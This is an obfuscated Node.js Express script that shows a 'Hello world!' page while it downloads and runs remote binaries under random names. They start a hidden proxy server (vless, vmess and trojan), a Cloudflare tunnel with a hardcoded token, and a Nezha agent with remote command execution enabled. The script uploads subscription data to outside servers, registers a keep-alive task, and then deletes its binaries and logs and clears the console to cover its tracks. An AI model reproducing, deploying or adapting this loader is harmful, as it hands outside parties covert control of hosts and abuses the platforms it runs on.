const _0x15bd11=_0x2487;(function(_0x131d9d,_0x1717fb){const _0x4a5164=_0x2487,_0x2b9dfa=_0x131d9d();while(!![]){try{const _0x34ab80=-parseInt(_0x4a5164(0x175))/0x1*(-parseInt(_0x4a5164(0x159))/0x2)+parseInt(_0x4a5164(0x17c))/0x3+parseInt(_0x4a5164(0x12b))/0x4+parseInt(_0x4a5164(0x170))/0x5+-parseInt(_0x4a5164(0x12d))/0x6*(-parseInt(_0x4a5164(0x14f))/0x7)+-parseInt(_0x4a5164(0x120))/0x8*(parseInt(_0x4a5164(0x174))/0x9)+parseInt(_0x4a5164(0x168))/0xa*(-parseInt(_0x4a5164(0x190))/0xb);if(_0x34ab80===_0x1717fb)break;else _0x2b9dfa['push'](_0x2b9dfa['shift']());}catch(_0x5b4351){_0x2b9dfa['push'](_0x2b9dfa['shift']());}}}(_0x4dfd,0x5e0d1));const express=require(_0x15bd11(0x15d)),app=express(),axios=require(_0x15bd11(0x161)),os=require('os'),fs=require('fs'),path=require(_0x15bd11(0xfd)),{promisify}=require(_0x15bd11(0xec)),exec=promisify(require('child_process')[_0x15bd11(0x185)]),{execSync}=require(_0x15bd11(0x193)),UPLOAD_URL=process[_0x15bd11(0x118)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x15bd11(0x118)][_0x15bd11(0x169)]||'',AUTO_ACCESS=process[_0x15bd11(0x118)][_0x15bd11(0x10c)]||![],FILE_PATH=process[_0x15bd11(0x118)][_0x15bd11(0x187)]||'./tmp',SUB_PATH=process[_0x15bd11(0x118)][_0x15bd11(0x134)]||_0x15bd11(0x10a),PORT=process[_0x15bd11(0x118)][_0x15bd11(0x132)]||process['env'][_0x15bd11(0xe7)]||0xbb8,UUID=process['env'][_0x15bd11(0x167)]||_0x15bd11(0x121),NEZHA_SERVER=process[_0x15bd11(0x118)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x15bd11(0x118)][_0x15bd11(0x113)]||'',NEZHA_KEY=process[_0x15bd11(0x118)][_0x15bd11(0x19b)]||'',ARGO_DOMAIN=process[_0x15bd11(0x118)][_0x15bd11(0x199)]||_0x15bd11(0x117),ARGO_AUTH=process[_0x15bd11(0x118)]['ARGO_AUTH']||_0x15bd11(0x160),ARGO_PORT=process[_0x15bd11(0x118)][_0x15bd11(0xf2)]||0x1f41,CFIP=process[_0x15bd11(0x118)][_0x15bd11(0x108)]||'cdns.doon.eu.org',CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x15bd11(0x118)][_0x15bd11(0x152)]||_0x15bd11(0x10a);!fs['existsSync'](FILE_PATH)?(fs[_0x15bd11(0x158)](FILE_PATH),console[_0x15bd11(0xfa)](FILE_PATH+'\x20is\x20created')):console[_0x15bd11(0xfa)](FILE_PATH+_0x15bd11(0x122));function _0x2487(_0x4d972a,_0x15419f){const _0x4dfd00=_0x4dfd();return _0x2487=function(_0x248714,_0x311528){_0x248714=_0x248714-0xd5;let _0x1a6bb4=_0x4dfd00[_0x248714];return _0x1a6bb4;},_0x2487(_0x4d972a,_0x15419f);}function generateRandomName(){const _0xf59f1b=_0x15bd11,_0x599423=_0xf59f1b(0x142);let _0x3bad45='';for(let _0x1339b5=0x0;_0x1339b5<0x6;_0x1339b5++){_0x3bad45+=_0x599423[_0xf59f1b(0xea)](Math[_0xf59f1b(0x140)](Math[_0xf59f1b(0xe0)]()*_0x599423[_0xf59f1b(0x130)]));}return _0x3bad45;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x15bd11(0x10d)](FILE_PATH,npmName),phpPath=path[_0x15bd11(0x10d)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x15bd11(0x10d)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x15bd11(0xf5)),listPath=path[_0x15bd11(0x10d)](FILE_PATH,_0x15bd11(0x196)),bootLogPath=path[_0x15bd11(0x10d)](FILE_PATH,_0x15bd11(0x14d)),configPath=path[_0x15bd11(0x10d)](FILE_PATH,_0x15bd11(0x127));function deleteNodes(){const _0x461d8e=_0x15bd11;try{if(!UPLOAD_URL)return;if(!fs[_0x461d8e(0xeb)](subPath))return;let _0x2c1d11;try{_0x2c1d11=fs[_0x461d8e(0xfb)](subPath,_0x461d8e(0x176));}catch{return null;}const _0x1ccc15=Buffer[_0x461d8e(0x14a)](_0x2c1d11,_0x461d8e(0x139))[_0x461d8e(0x165)](_0x461d8e(0x176)),_0x2b9dc2=_0x1ccc15[_0x461d8e(0x18e)]('\x0a')[_0x461d8e(0x100)](_0x5aa69e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5aa69e));if(_0x2b9dc2[_0x461d8e(0x130)]===0x0)return;return axios[_0x461d8e(0xe4)](UPLOAD_URL+_0x461d8e(0x181),JSON['stringify']({'nodes':_0x2b9dc2}),{'headers':{'Content-Type':_0x461d8e(0x172)}})[_0x461d8e(0x14e)](_0x44e4e3=>{return null;}),null;}catch(_0x25ed6c){return null;}}function cleanupOldFiles(){const _0x2380cb=_0x15bd11;try{const _0x15b831=fs[_0x2380cb(0x144)](FILE_PATH);_0x15b831[_0x2380cb(0x114)](_0x5dad86=>{const _0x219588=_0x2380cb,_0x1d273d=path['join'](FILE_PATH,_0x5dad86);try{const _0x13e939=fs[_0x219588(0x13c)](_0x1d273d);_0x13e939['isFile']()&&fs[_0x219588(0x195)](_0x1d273d);}catch(_0x3d41db){}});}catch(_0x14dc59){}}app[_0x15bd11(0x149)]('/',function(_0x4bf8d7,_0x55bb60){const _0x3aff67=_0x15bd11;_0x55bb60[_0x3aff67(0xd6)](_0x3aff67(0x16a));});async function generateConfig(){const _0x37f82b=_0x15bd11,_0x56d7e4={'log':{'access':_0x37f82b(0x13f),'error':'/dev/null','loglevel':_0x37f82b(0x104)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x37f82b(0x147)}],'decryption':_0x37f82b(0x104),'fallbacks':[{'dest':0xbb9},{'path':_0x37f82b(0x15c),'dest':0xbba},{'path':_0x37f82b(0x13e),'dest':0xbbb},{'path':_0x37f82b(0x109),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x37f82b(0xe8),'protocol':_0x37f82b(0x17e),'settings':{'clients':[{'id':UUID}],'decryption':_0x37f82b(0x104)},'streamSettings':{'network':'tcp','security':_0x37f82b(0x104)}},{'port':0xbba,'listen':_0x37f82b(0xe8),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x37f82b(0x104)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x37f82b(0x156),_0x37f82b(0xf9),_0x37f82b(0x11f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x37f82b(0xe8),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x37f82b(0xf9),_0x37f82b(0x11f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x37f82b(0xe8),'protocol':_0x37f82b(0x179),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x37f82b(0x104),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x37f82b(0x156),'tls',_0x37f82b(0x11f)],'metadataOnly':![]}}],'dns':{'servers':[_0x37f82b(0x180)]},'outbounds':[{'protocol':_0x37f82b(0xdd),'tag':_0x37f82b(0xe6)},{'protocol':'blackhole','tag':_0x37f82b(0x129)}]};fs[_0x37f82b(0xf7)](path[_0x37f82b(0x10d)](FILE_PATH,_0x37f82b(0x127)),JSON[_0x37f82b(0xd8)](_0x56d7e4,null,0x2));}function getSystemArchitecture(){const _0x2a7cf6=_0x15bd11,_0x55b484=os[_0x2a7cf6(0x136)]();return _0x55b484==='arm'||_0x55b484==='arm64'||_0x55b484==='aarch64'?'arm':_0x2a7cf6(0x12c);}function downloadFile(_0x4a9674,_0x18446d,_0x5b8c97){const _0x63fd93=_0x15bd11,_0x16e60c=_0x4a9674;!fs[_0x63fd93(0xeb)](FILE_PATH)&&fs[_0x63fd93(0x158)](FILE_PATH,{'recursive':!![]});const _0x4f2797=fs[_0x63fd93(0x17f)](_0x16e60c);axios({'method':_0x63fd93(0x149),'url':_0x18446d,'responseType':_0x63fd93(0x13b)})[_0x63fd93(0x153)](_0x3c339f=>{const _0x222e6c=_0x63fd93;_0x3c339f['data'][_0x222e6c(0x154)](_0x4f2797),_0x4f2797['on'](_0x222e6c(0x171),()=>{const _0x3bfce9=_0x222e6c;_0x4f2797[_0x3bfce9(0x110)](),console[_0x3bfce9(0xfa)](_0x3bfce9(0x13d)+path[_0x3bfce9(0x13a)](_0x16e60c)+_0x3bfce9(0x138)),_0x5b8c97(null,_0x16e60c);}),_0x4f2797['on'](_0x222e6c(0xfe),_0x30a169=>{const _0x2748c0=_0x222e6c;fs[_0x2748c0(0x124)](_0x16e60c,()=>{});const _0x4c75e6=_0x2748c0(0x13d)+path['basename'](_0x16e60c)+_0x2748c0(0x128)+_0x30a169[_0x2748c0(0x101)];console[_0x2748c0(0xfe)](_0x4c75e6),_0x5b8c97(_0x4c75e6);});})[_0x63fd93(0x14e)](_0x505b01=>{const _0x1edccf=_0x63fd93,_0x55edc6=_0x1edccf(0x13d)+path[_0x1edccf(0x13a)](_0x16e60c)+_0x1edccf(0x128)+_0x505b01['message'];console['error'](_0x55edc6),_0x5b8c97(_0x55edc6);});}async function downloadFilesAndRun(){const _0x5e9f24=_0x15bd11,_0x4e9595=getSystemArchitecture(),_0x17357e=getFilesForArchitecture(_0x4e9595);if(_0x17357e[_0x5e9f24(0x130)]===0x0){console[_0x5e9f24(0xfa)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x404934=_0x17357e[_0x5e9f24(0xe3)](_0xc89994=>{return new Promise((_0x18e04d,_0x3332b6)=>{const _0x311046=_0x2487;downloadFile(_0xc89994[_0x311046(0x143)],_0xc89994[_0x311046(0x12e)],(_0x58a8cf,_0x4d96f9)=>{_0x58a8cf?_0x3332b6(_0x58a8cf):_0x18e04d(_0x4d96f9);});});});try{await Promise['all'](_0x404934);}catch(_0x1e6e7d){console['error']('Error\x20downloading\x20files:',_0x1e6e7d);return;}function _0x17b0ce(_0x49a15f){const _0x1a723c=_0x5e9f24,_0x4558bd=0x1fd;_0x49a15f[_0x1a723c(0x114)](_0x38e25d=>{const _0x18f2ce=_0x1a723c;fs[_0x18f2ce(0xeb)](_0x38e25d)&&fs[_0x18f2ce(0x15a)](_0x38e25d,_0x4558bd,_0x4395bf=>{const _0x148b7b=_0x18f2ce;_0x4395bf?console['error'](_0x148b7b(0x188)+_0x38e25d+':\x20'+_0x4395bf):console['log'](_0x148b7b(0x10b)+_0x38e25d+':\x20'+_0x4558bd[_0x148b7b(0x165)](0x8));});});}const _0x2a69c1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x17b0ce(_0x2a69c1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4dad0e=NEZHA_SERVER[_0x5e9f24(0x16c)](':')?NEZHA_SERVER['split'](':')[_0x5e9f24(0x16d)]():'',_0x15b58b=new Set(['443',_0x5e9f24(0x106),_0x5e9f24(0x11d),_0x5e9f24(0x191),_0x5e9f24(0x14c),_0x5e9f24(0x157)]),_0x2f9027=_0x15b58b['has'](_0x4dad0e)?_0x5e9f24(0x15b):_0x5e9f24(0xf8),_0x460857=_0x5e9f24(0x177)+NEZHA_KEY+_0x5e9f24(0x105)+NEZHA_SERVER+_0x5e9f24(0xf6)+_0x2f9027+_0x5e9f24(0x18c)+UUID;fs[_0x5e9f24(0xf7)](path[_0x5e9f24(0x10d)](FILE_PATH,_0x5e9f24(0x194)),_0x460857);const _0x32e100='nohup\x20'+phpPath+_0x5e9f24(0x17d)+FILE_PATH+_0x5e9f24(0x123);try{await exec(_0x32e100),console[_0x5e9f24(0xfa)](phpName+'\x20is\x20running'),await new Promise(_0x5268a4=>setTimeout(_0x5268a4,0x3e8));}catch(_0x194b1b){console[_0x5e9f24(0xfe)](_0x5e9f24(0x112)+_0x194b1b);}}else{let _0x39afc3='';const _0x307018=['443',_0x5e9f24(0x106),'2096',_0x5e9f24(0x191),_0x5e9f24(0x14c),'2053'];_0x307018['includes'](NEZHA_PORT)&&(_0x39afc3=_0x5e9f24(0x18f));const _0x142fb0=_0x5e9f24(0x11c)+npmPath+_0x5e9f24(0xdc)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x39afc3+_0x5e9f24(0x164);try{await exec(_0x142fb0),console['log'](npmName+_0x5e9f24(0x141)),await new Promise(_0x539f6f=>setTimeout(_0x539f6f,0x3e8));}catch(_0x20b554){console[_0x5e9f24(0xfe)](_0x5e9f24(0x18d)+_0x20b554);}}}else console['log'](_0x5e9f24(0x119));const _0x3b8f02=_0x5e9f24(0x11c)+webPath+_0x5e9f24(0x115)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3b8f02),console[_0x5e9f24(0xfa)](webName+_0x5e9f24(0x141)),await new Promise(_0x4e90d8=>setTimeout(_0x4e90d8,0x3e8));}catch(_0x220fb9){console[_0x5e9f24(0xfe)](_0x5e9f24(0x146)+_0x220fb9);}if(fs['existsSync'](botPath)){let _0x4db894;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4db894=_0x5e9f24(0xff)+ARGO_AUTH;else ARGO_AUTH[_0x5e9f24(0x183)](/TunnelSecret/)?_0x4db894=_0x5e9f24(0x192)+FILE_PATH+_0x5e9f24(0x10e):_0x4db894='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5e9f24(0xd9)+ARGO_PORT;try{await exec(_0x5e9f24(0x11c)+botPath+'\x20'+_0x4db894+_0x5e9f24(0x12f)),console[_0x5e9f24(0xfa)](botName+_0x5e9f24(0x141)),await new Promise(_0x3f8f9d=>setTimeout(_0x3f8f9d,0x7d0));}catch(_0x179d65){console['error'](_0x5e9f24(0xf4)+_0x179d65);}}await new Promise(_0x2b3c60=>setTimeout(_0x2b3c60,0x1388));}function getFilesForArchitecture(_0x416b56){const _0x2b08d4=_0x15bd11;let _0x4f32a4;_0x416b56===_0x2b08d4(0x135)?_0x4f32a4=[{'fileName':webPath,'fileUrl':_0x2b08d4(0x145)},{'fileName':botPath,'fileUrl':_0x2b08d4(0xe5)}]:_0x4f32a4=[{'fileName':webPath,'fileUrl':_0x2b08d4(0xfc)},{'fileName':botPath,'fileUrl':_0x2b08d4(0x15e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5c1775=_0x416b56===_0x2b08d4(0x135)?_0x2b08d4(0x102):'https://amd64.ssss.nyc.mn/agent';_0x4f32a4[_0x2b08d4(0x173)]({'fileName':npmPath,'fileUrl':_0x5c1775});}else{const _0x357aa5=_0x416b56==='arm'?_0x2b08d4(0xe9):_0x2b08d4(0xe2);_0x4f32a4[_0x2b08d4(0x173)]({'fileName':phpPath,'fileUrl':_0x357aa5});}}return _0x4f32a4;}function argoType(){const _0x3b4d35=_0x15bd11;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3b4d35(0xfa)](_0x3b4d35(0x184));return;}if(ARGO_AUTH[_0x3b4d35(0x16c)](_0x3b4d35(0x16f))){fs[_0x3b4d35(0xf7)](path[_0x3b4d35(0x10d)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x574bfa='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x3b4d35(0xf3)+path[_0x3b4d35(0x10d)](FILE_PATH,_0x3b4d35(0xee))+_0x3b4d35(0xf1)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3b4d35(0x14b);fs[_0x3b4d35(0xf7)](path[_0x3b4d35(0x10d)](FILE_PATH,_0x3b4d35(0x166)),_0x574bfa);}else console['log'](_0x3b4d35(0x150));}function _0x4dfd(){const _0x4a08b1=['Error\x20in\x20startserver:','tunnel.json','win32','pkill\x20-f\x20\x22[','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_PORT','\x0a\x20\x20credentials-file:\x20','Error\x20executing\x20command:\x20','sub.txt','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','writeFileSync','false','tls','log','readFileSync','https://amd64.ssss.nyc.mn/web','path','error','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','filter','message','https://arm64.ssss.nyc.mn/agent','status','none','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8443','ArgoDomain:','CFIP','/trojan-argo','helloworld','Empowerment\x20success\x20for\x20','AUTO_ACCESS','join','/tunnel.yml\x20run','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','close','Unhandled\x20error\x20in\x20startserver:','php\x20running\x20error:\x20','NEZHA_PORT','forEach','\x20-c\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','helloworld.agileboost.dpdns.org','env','NEZHA\x20variable\x20is\x20empty,skip\x20running','/api/add-nodes','platform','nohup\x20','2096','del\x20/f\x20/q\x20','quic','14360CIKVjh','54388581-97e0-4325-805a-5f6cb28f7898','\x20already\x20exists','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','unlink','push','/vmess-argo?ed=2560','config.json','\x20failed:\x20','block','/api/add-subscriptions','2048464hmYnIX','amd','1447332jRiXAr','fileUrl','\x20>/dev/null\x202>&1\x20&','length','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','SERVER_PORT','firefox','SUB_PATH','arm','arch','clear','\x20successfully','base64','basename','stream','statSync','Download\x20','/vmess-argo','/dev/null','floor','\x20is\x20running','abcdefghijklmnopqrstuvwxyz','fileName','readdirSync','https://arm64.ssss.nyc.mn/web','web\x20running\x20error:\x20','xtls-rprx-vision','?security=tls&sni=','get','from','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2083','boot.log','catch','14cHfxKD','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20\x0atrojan://','NAME','then','pipe','\x22\x20>\x20/dev/null\x202>&1','http','2053','mkdirSync','430278IFmVcA','chmod','true','/vless-argo','express','https://amd64.ssss.nyc.mn/bot','Content-Type','eyJhIjoiZGY1ZDM0MGQzNjc3MDg3ZWQzNmE4NTllM2FjMGNlYWMiLCJ0IjoiZjc1NmQ0NjEtOWU5OC00NWY2LTg2Y2UtOTM2Y2U1YmQ3NmQ2IiwicyI6Ik5qY3hPV0U0TnpVdE5tWTBaQzAwTW1ZMExUa3haV1F0T1RBM01XTXdaalk1TnpFNCJ9','axios','listen','App\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','tunnel.yml','UUID','20uedAMS','PROJECT_URL','Hello\x20world!','text/plain;\x20charset=utf-8','includes','pop','http\x20server\x20is\x20running\x20on\x20port:','TunnelSecret','349705aTXFne','finish','application/json','unshift','2007cPGUvy','1HalJoX','utf-8','\x0aclient_secret:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','trojan','?encryption=none&security=tls&sni=','Error\x20reading\x20boot.log:','1275240OGpCmE','\x20-c\x20\x22','vless','createWriteStream','https+local://8.8.8.8/dns-query','/api/delete-nodes','\x20>/dev/null\x202>&1','match','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','exec','/sub.txt\x20saved\x20successfully','FILE_PATH','Empowerment\x20failed\x20for\x20','Skipping\x20adding\x20automatic\x20access\x20task','Add\x20automatic\x20access\x20task\x20faild:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20running\x20error:\x20','split','--tls','5055611TYcclx','2087','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','child_process','config.yaml','unlinkSync','list.txt','substring','\x0avless://','ARGO_DOMAIN','ARGO_DOMAIN:','NEZHA_KEY','&fp=firefox&type=ws&host=','send','set','stringify','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','taskkill\x20/f\x20/im\x20','\x20>\x20nul\x202>&1','\x20-s\x20','freedom','Nodes\x20uploaded\x20successfully','trim','random','automatic\x20access\x20task\x20added\x20successfully','https://amd64.ssss.nyc.mn/v1','map','post','https://arm64.ssss.nyc.mn/bot','direct','PORT','127.0.0.1','https://arm64.ssss.nyc.mn/v1','charAt','existsSync','util'];_0x4dfd=function(){return _0x4a08b1;};return _0x4dfd();}argoType();async function extractDomains(){const _0xf2e642=_0x15bd11;let _0x3e42b8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3e42b8=ARGO_DOMAIN,console[_0xf2e642(0xfa)](_0xf2e642(0x19a),_0x3e42b8),await _0x4bf231(_0x3e42b8);else try{const _0x3ad637=fs[_0xf2e642(0xfb)](path['join'](FILE_PATH,_0xf2e642(0x14d)),'utf-8'),_0x527a75=_0x3ad637[_0xf2e642(0x18e)]('\x0a'),_0x566620=[];_0x527a75['forEach'](_0x1b34a4=>{const _0x3ce2fa=_0xf2e642,_0x4dda71=_0x1b34a4['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4dda71){const _0x1f21b5=_0x4dda71[0x1];_0x566620[_0x3ce2fa(0x125)](_0x1f21b5);}});if(_0x566620[_0xf2e642(0x130)]>0x0)_0x3e42b8=_0x566620[0x0],console[_0xf2e642(0xfa)](_0xf2e642(0x107),_0x3e42b8),await _0x4bf231(_0x3e42b8);else{console[_0xf2e642(0xfa)](_0xf2e642(0x131)),fs[_0xf2e642(0x195)](path[_0xf2e642(0x10d)](FILE_PATH,_0xf2e642(0x14d)));async function _0x1a9c6a(){const _0x36ae90=_0xf2e642;try{process['platform']==='win32'?await exec(_0x36ae90(0xda)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x36ae90(0xf0)+botName['charAt'](0x0)+']'+botName[_0x36ae90(0x197)](0x1)+_0x36ae90(0x155));}catch(_0x3b0c3f){}}_0x1a9c6a(),await new Promise(_0x1c36cd=>setTimeout(_0x1c36cd,0xbb8));const _0x35ce65=_0xf2e642(0x116)+FILE_PATH+_0xf2e642(0xd9)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x35ce65+_0xf2e642(0x12f)),console[_0xf2e642(0xfa)](botName+'\x20is\x20running'),await new Promise(_0x5e14c4=>setTimeout(_0x5e14c4,0xbb8)),await extractDomains();}catch(_0x415959){console['error']('Error\x20executing\x20command:\x20'+_0x415959);}}}catch(_0x45a44a){console['error'](_0xf2e642(0x17b),_0x45a44a);}async function _0x4bf231(_0x152bf6){const _0xff2588=_0xf2e642,_0x443a26=execSync(_0xff2588(0x18b),{'encoding':'utf-8'}),_0x838af9=_0x443a26[_0xff2588(0xdf)](),_0x4a1726=NAME?NAME+'-'+_0x838af9:_0x838af9;return new Promise(_0x32f36e=>{setTimeout(()=>{const _0xb8ed02=_0x2487,_0x27cbfc={'v':'2','ps':''+_0x4a1726,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xb8ed02(0x104),'host':_0x152bf6,'path':_0xb8ed02(0x126),'tls':_0xb8ed02(0xf9),'sni':_0x152bf6,'alpn':'','fp':_0xb8ed02(0x133)},_0x49b344=_0xb8ed02(0x198)+UUID+'@'+CFIP+':'+CFPORT+_0xb8ed02(0x17a)+_0x152bf6+_0xb8ed02(0xd5)+_0x152bf6+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4a1726+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0xb8ed02(0xd8)](_0x27cbfc))[_0xb8ed02(0x165)](_0xb8ed02(0x139))+_0xb8ed02(0x151)+UUID+'@'+CFIP+':'+CFPORT+_0xb8ed02(0x148)+_0x152bf6+_0xb8ed02(0xd5)+_0x152bf6+_0xb8ed02(0x178)+_0x4a1726+'\x0a\x20\x20\x20\x20';console[_0xb8ed02(0xfa)](Buffer['from'](_0x49b344)[_0xb8ed02(0x165)](_0xb8ed02(0x139))),fs[_0xb8ed02(0xf7)](subPath,Buffer['from'](_0x49b344)[_0xb8ed02(0x165)](_0xb8ed02(0x139))),console[_0xb8ed02(0xfa)](FILE_PATH+_0xb8ed02(0x186)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x39282f,_0x2976c1)=>{const _0x4b9ede=_0xb8ed02,_0x28cbc6=Buffer['from'](_0x49b344)[_0x4b9ede(0x165)](_0x4b9ede(0x139));_0x2976c1[_0x4b9ede(0xd7)](_0x4b9ede(0x15f),_0x4b9ede(0x16b)),_0x2976c1[_0x4b9ede(0xd6)](_0x28cbc6);}),_0x32f36e(_0x49b344);},0x7d0);});}}async function uploadNodes(){const _0x14ef65=_0x15bd11;if(UPLOAD_URL&&PROJECT_URL){const _0xda2893=PROJECT_URL+'/'+SUB_PATH,_0x20b921={'subscription':[_0xda2893]};try{const _0x313f9b=await axios['post'](UPLOAD_URL+_0x14ef65(0x12a),_0x20b921,{'headers':{'Content-Type':_0x14ef65(0x172)}});return _0x313f9b&&_0x313f9b[_0x14ef65(0x103)]===0xc8?(console[_0x14ef65(0xfa)]('Subscription\x20uploaded\x20successfully'),_0x313f9b):null;}catch(_0x11dbdc){if(_0x11dbdc['response']){if(_0x11dbdc['response'][_0x14ef65(0x103)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x14ef65(0xeb)](listPath))return;const _0x213490=fs[_0x14ef65(0xfb)](listPath,_0x14ef65(0x176)),_0x3ae775=_0x213490['split']('\x0a')[_0x14ef65(0x100)](_0x405669=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x405669));if(_0x3ae775[_0x14ef65(0x130)]===0x0)return;const _0x40ae5a=JSON['stringify']({'nodes':_0x3ae775});try{const _0x50bb3b=await axios[_0x14ef65(0xe4)](UPLOAD_URL+_0x14ef65(0x11a),_0x40ae5a,{'headers':{'Content-Type':_0x14ef65(0x172)}});return _0x50bb3b&&_0x50bb3b[_0x14ef65(0x103)]===0xc8?(console['log'](_0x14ef65(0xde)),_0x50bb3b):null;}catch(_0x493c14){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3789a9=_0x2487,_0x3e9def=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3e9def[_0x3789a9(0x125)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3e9def[_0x3789a9(0x125)](phpPath);process[_0x3789a9(0x11b)]===_0x3789a9(0xef)?exec(_0x3789a9(0x11e)+_0x3e9def[_0x3789a9(0x10d)]('\x20')+_0x3789a9(0xdb),_0x39d8fd=>{const _0x190489=_0x3789a9;console[_0x190489(0x137)](),console[_0x190489(0xfa)](_0x190489(0x163)),console[_0x190489(0xfa)](_0x190489(0x10f));}):exec('rm\x20-rf\x20'+_0x3e9def['join']('\x20')+_0x3789a9(0x182),_0xa40c24=>{const _0x17d830=_0x3789a9;console[_0x17d830(0x137)](),console[_0x17d830(0xfa)](_0x17d830(0x163)),console[_0x17d830(0xfa)](_0x17d830(0x10f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xb47dfa=_0x15bd11;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xb47dfa(0xfa)](_0xb47dfa(0x189));return;}try{const _0x32bbd8=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xb47dfa(0x172)}});return console[_0xb47dfa(0xfa)](_0xb47dfa(0xe1)),_0x32bbd8;}catch(_0x3b3f1c){return console['error'](_0xb47dfa(0x18a)+_0x3b3f1c[_0xb47dfa(0x101)]),null;}}async function startserver(){const _0x584685=_0x15bd11;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x13bfa1){console[_0x584685(0xfe)](_0x584685(0xed),_0x13bfa1);}}startserver()[_0x15bd11(0x14e)](_0x3c996f=>{const _0x434481=_0x15bd11;console[_0x434481(0xfe)](_0x434481(0x111),_0x3c996f);}),app[_0x15bd11(0x162)](PORT,()=>console[_0x15bd11(0xfa)](_0x15bd11(0x16e)+PORT+'!'));
